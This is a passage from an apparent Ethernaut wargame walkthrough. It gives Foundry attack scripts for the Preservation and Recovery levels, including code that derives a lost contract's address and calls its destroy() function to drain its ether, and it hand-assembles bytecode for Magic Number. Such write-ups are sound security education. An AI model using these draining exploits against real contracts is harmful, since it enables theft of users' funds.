</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Level16Sol</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Script</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>      </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">run</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            Preservation preservation </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">Preservation</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0xA1979400E9bbCEcd6B13aA814281A6B95866A077</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>            vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">startBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;PRIVATE_KEY&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>            Attack attack </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>            attack</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">exploit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>            vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">stopBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>To run the script</strong></p>
<pre><code>$ source .env
$ forge script script/Level16Solution.s.sol:Level16Sol --rpc-url $RPC_URL --broadcast
</code></pre>
<h2>Recovery</h2>
<p><strong>Level17.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Recovery</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>  </span><span class="token" style="color:#6a9955">//generate tokens</span><span>
</span><span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">generateToken</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">string</span><span> </span><span class="token" style="color:#569CD6">memory</span><span> _name</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">uint256</span><span> _initialSupply</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">SimpleToken</span><span class="token" style="color:#d4d4d4">(</span><span>_name</span><span class="token" style="color:#d4d4d4">,</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">,</span><span> _initialSupply</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">SimpleToken</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>  </span><span class="token" style="color:#ce9178">string</span><span> </span><span class="token" style="color:#569CD6">public</span><span> name</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#569CD6">mapping</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#d4d4d4">=&gt;</span><span> </span><span class="token" style="color:#ce9178">uint</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> balances</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>  </span><span class="token" style="color:#6a9955">// constructor</span><span>
</span><span>  </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">string</span><span> </span><span class="token" style="color:#569CD6">memory</span><span> _name</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span> _creator</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">uint256</span><span> _initialSupply</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    name </span><span class="token" style="color:#d4d4d4">=</span><span> _name</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    balances</span><span class="token" style="color:#d4d4d4">[</span><span>_creator</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> _initialSupply</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#6a9955">// collect ether in return for tokens</span><span>
</span><span>  </span><span class="token" style="color:#dcdcaa">receive</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#569CD6">payable</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    balances</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>value </span><span class="token" style="color:#d4d4d4">*</span><span> </span><span class="token" style="color:#b5cea8">10</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#6a9955">// allow transfers of tokens</span><span>
</span><span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">transfer</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> _to</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">uint</span><span> _amount</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>balances</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">&gt;=</span><span> _amount</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    balances</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> balances</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">-</span><span> _amount</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    balances</span><span class="token" style="color:#d4d4d4">[</span><span>_to</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> _amount</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#6a9955">// clean up after ourselves</span><span>
</span><span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">destroy</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">payable</span><span> _to</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">selfdestruct</span><span class="token" style="color:#d4d4d4">(</span><span>_to</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>Goal:</strong></p>
<p>This level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.</p>
<p><strong>Explanation:</strong></p>
<ol>
<li>The SimpleToken contract is funded with 0.001 ether. We need to drain those ether.</li>
<li>To drain ether we can simply call the <code>destroy()</code> function of the SimpleToken contract.</li>
<li>But we dont have the address of the SimpleToken. We can user ETHERSCAN to identify the transaction of Recovery contract to find the address of the SimpleToken.</li>
<li>We can also use a formula that is mentioned in ethereum yellow paper about how a newly created contract address will be computed.</li>
<li>The formula is <code>address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(_creator), bytes1(0x01))))))</code></li>
<li><code>0xd6</code> and <code>0x94</code> are constants and the last byte1 is the nonce, i.e, number contracts created from the existed contract. We assume that its one.</li>
<li>By this formula we can recover the SimpleToken address and call the <code>destroy()</code> function to drain all ether.</li>
</ol>
<p><strong>Level17Solution.s.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Script.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/console.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>Recovery</span><span class="token" style="color:#d4d4d4">}</span><span> </span><span class="token" style="color:#569CD6">from</span><span> </span><span class="token" style="color:#ce9178">&quot;../src/Level17.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Level17Sol</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Script</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    Recovery </span><span class="token" style="color:#569CD6">public</span><span> recovery </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">Recovery</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x7b9D82e39aa30ddAf4c5a9f132F4834926107Caf</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">run</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">startBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;PRIVATE_KEY&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">address</span><span> myAddress </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envAddress</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;MY_ADDRESS&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        Attack attack </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Attack Address : &quot;</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>attack</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;MY Balance : &quot;</span><span class="token" style="color:#d4d4d4">,</span><span> myAddress</span><span class="token" style="color:#d4d4d4">.</span><span>balance</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#ce9178">address</span><span> _creator </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>recovery</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#ce9178">address</span><span> token </span><span class="token" style="color:#d4d4d4">=</span><span> attack</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">exploit</span><span class="token" style="color:#d4d4d4">(</span><span>_creator</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#569CD6">payable</span><span class="token" style="color:#d4d4d4">(</span><span>myAddress</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Token Address : &quot;</span><span class="token" style="color:#d4d4d4">,</span><span> token</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;MY Balance : &quot;</span><span class="token" style="color:#d4d4d4">,</span><span> myAddress</span><span class="token" style="color:#d4d4d4">.</span><span>balance</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">stopBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">exploit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> _creator</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">payable</span><span> _myAddress</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#569CD6">returns</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#ce9178">address</span><span> missedToken </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint160</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint256</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">keccak256</span><span class="token" style="color:#d4d4d4">(</span><span>abi</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">encodePacked</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bytes1</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0xd6</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">bytes1</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x94</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>_creator</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">bytes1</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x01</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        missedToken</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">call</span><span class="token" style="color:#d4d4d4">(</span><span>abi</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">encodeWithSignature</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;destroy(address)&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> _myAddress</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#569CD6">return</span><span> missedToken</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>To run the script</strong></p>
<pre><code>$ source .env
$ forge script script/Level17Solution.s.sol:Level17Sol --rpc-url $RPC_URL --broadcast

</code></pre>
<h2>Magic Number</h2>
<p><strong>Level18.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">MagicNum</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>  </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> solver</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">setSolver</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> _solver</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    solver </span><span class="token" style="color:#d4d4d4">=</span><span> _solver</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#6a9955">/*
</span><span class="token" style="color:#6a9955">    ____________/\_______/\\\\_____
</span><span class="token" style="color:#6a9955">     __________/\\_____/\///////\___
</span><span class="token" style="color:#6a9955">      ________/\/\____///______//\__
</span><span class="token" style="color:#6a9955">       ______/\//\______________/\/___
</span><span class="token" style="color:#6a9955">        ____/\/__/\___________/\//_____
</span><span class="token" style="color:#6a9955">         __/\\\\\\\\_____/\//________
</span><span class="token" style="color:#6a9955">          _///////////\//____/\/___________
</span><span class="token" style="color:#6a9955">           ___________/\_____/\\\\\\\_
</span><span class="token" style="color:#6a9955">            ___________///_____///////////////__
</span><span class="token" style="color:#6a9955">  */</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>Goal:</strong></p>
<p>To solve this level, you only need to provide the Ethernaut with a Solver, a contract that responds to whatIsTheMeaningOfLife() with the right number. But the solver contract should be very small at most 10 OPCODES.</p>
<p><strong>Explanation:</strong></p>
<ol>
<li>To solve this challenge we need to write a contract that return 42. But the contract should be written with at most 10 OPCODES.</li>
<li>We need write our contract in Assembly not in solidity, so that we can build very tiny contract with less OPCODES.</li>
<li>Then we can convert it into bytecode and deploy onto blockchain and then pass the address to the <code>setSolver()</code> function.</li>
<li>Bytecodes are divided into two main types in solidity.<!-- -->
<ol>
<li>Runtime bytecode</li>
<li>Creation bytecode</li>
</ol>
</li>
<li><strong>Runtime bytecode</strong> will be stored on blockchain and executes when a call happens</li>
<li><strong>Creation code</strong> consist of <strong>init data</strong>, <strong>runtime data</strong> and <strong>constructor bytecode</strong>. We need to create a runtime code which returns 42 upon call and append it with some init data which is required to deploy a contract.</li>
<li>We can use this creation code to deploy a contract using <code>create</code> opcode and pass the address of the deployed contract to <code>setSolver()</code>.</li>
</ol>
<pre><code>OPCODE   |    NAME
---------|---------
 0x60    |    PUSH1
 0x69    |    PUSH10
 0x52    |    MSTORE
 0xf3    |    RETURN

Runtime Opcode Creation:

PUSH1 0x2a (602a) - Pushing 42(0x2a) into the stack. Value(v) parameter to MSTORE.
PUSH1 0x00 (6000) - Pushing 0x00 into the stack. Position(p) parameter to MSTORE.
MSTORE     (52)   - Store value (0x2a) at position 0x00 in memory.
PUSH1 0x20 (6020) - Pushing 32 bytes into the stack. Size(s) parameter to RETURN.
PUSH1 0x00 (6000) - Pushing 0x00 into the stack. Position(p) parameter to RETURN.
RETURN     (f3)   - Returning value of size (32 bytes) from position (0x00).

Concatenating these opcodes gives the runtime bytecode as 602a60005260206000f3.


Initialization Opcode Creation:

PUSH10 0x602a60005260206000f3 (69602a60005260206000f3) - Pushing runtime bytecode into the stack.
                                                         Value(v) parameter to MSTORE.

PUSH1 0x00 (6000)                                      - Pushing 0x00 into the stack.
                                                         Position(p) parameter to MSTORE.

MSTORE (52)                                            - Stores runtime bytecode at
                                                         position 0x00 into memory.


PUSH1 0x0a (600a)                                      - Pushing 10 (length of the runtime code)
                                                         into the stack. Size(s) parameter to RETURN.

PUSH1 0x16 (6016)                                      - Pushing 22 (offset position) into the stack.
                                                         Position(p) parameter to RETURN.


RETURN (f3)                                            - Returning value of size (10 bytes)
                                                         from position (22).

Concatenating these opcodes gives the initialization code as 69602a60005260206000f3600052600a6016f3.

</code></pre>
<p><strong>Level18Solution.s.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Script.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/console.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
